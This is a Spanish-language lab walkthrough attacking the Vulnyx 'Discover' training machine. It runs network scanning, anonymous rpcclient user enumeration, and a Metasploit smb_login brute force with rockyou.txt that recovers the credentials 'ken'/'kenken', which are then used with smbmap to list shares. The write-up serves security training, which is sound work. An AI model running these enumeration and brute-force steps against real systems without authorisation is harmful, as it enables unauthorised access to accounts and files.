# Enumeración de Usuarios SAMBA y uso de RPCCLIENT

Maquina que vamos a utilizar **Kali Linux y Discover** [https://vulnyx.com/#discover](https://vulnyx.com/#discover)

<aside>
💡

Aunque el protocolo **SMB** y el Samba corren por el mismo **puerto 445** no son lo mismo.

El protocolo **Samba** es una implementación libre del protocolo SMB (Server Message Block), que permite **compartir** archivos, impresoras y otros recursos **en redes entre sistemas Windows y Unix/Linux**. Samba facilita la comunicación entre dispositivos de diferentes plataformas, permitiendo que sistemas basados en Unix actúen como servidores o clientes en redes Windows. 

</aside>

En el momento que nos encontremos con el puerto 445 abierto o SAMBA funcionando, debemos de utilizar una **herramienta** conocida como **RPCCLIENT** para tratar de enumerar usuarios existentes dentro de la máquina objetivo.

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2020.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.17
```

![image.png](./imagenes/image%2021.png)

- Empezamos con la **premisa que esta vez no tenemos usuarios ni contraseñas**.
- Utilizamos la **herramienta rpcclient.**
    
    `rpcclient -U "" -N 10.0.3.17`
    
    ![image.png](./imagenes/image%2022.png)
    
    Se nos muestra un prompt. Debemos conocer tres comandos importantes que podemos utilizar aquí:
    
    <aside>
    💡
    
    - **`srvinfo`**: Este comando proporciona **información** sobre el servidor remoto, como el **sistema operativo, el nombre del servidor y otros detalles relevantes.** Es útil para obtener una visión general del sistema objetivo.
    - **`querydispinfo`**: Este comando **enumera** información sobre los **usuarios del dominio**, como nombres de usuario y descripciones. Es útil para identificar cuentas activas en el sistema.
    - **`enumdomusers`**: Este comando **enumera todos los usuarios del dominio**. Es una forma eficaz de obtener una lista completa de las cuentas de usuario en el sistema remoto.
    </aside>
    
    ![image.png](./imagenes/image%2023.png)
    
    **Ya tengo los usuarios.**
    

- Vamos a usar Metasploit para hacer un ataque de fuerza bruta al puerto 445.
    
    Vamos a usar el scanner `scanner/smb/smb_login`
    
    - `use scanner/smb/smb_login`
        
        ![image.png](./imagenes/image%2024.png)
        

- `show options`
    
    ![image.png](./imagenes/image%2025.png)
    

- `set RHOSTS 10.0.3.17`
- `set PASS_FILE /usr/share/wordlists/rockyou.txt`
- `set VERBOSE false`
- `set SMBUser ken`
- `show options`
    
    ![image.png](./imagenes/image%2026.png)
    

- `run`
    
    ![image.png](./imagenes/image%2027.png)
    

- Una vez que ya tenemos el usuario y contraseña en un terminal  usamos la **herramienta smbmap.**
    
    ```bash
    smbmap -u 'ken' -p 'kenken' -H 10.0.3.17
    ```
    
    ![image.png](./imagenes/image%2028.png)
    

```bash
smbmap -u 'ken' -p 'kenken' -H 10.0.3.17 -r ken
```

![image.png](./imagenes/image%2029.png)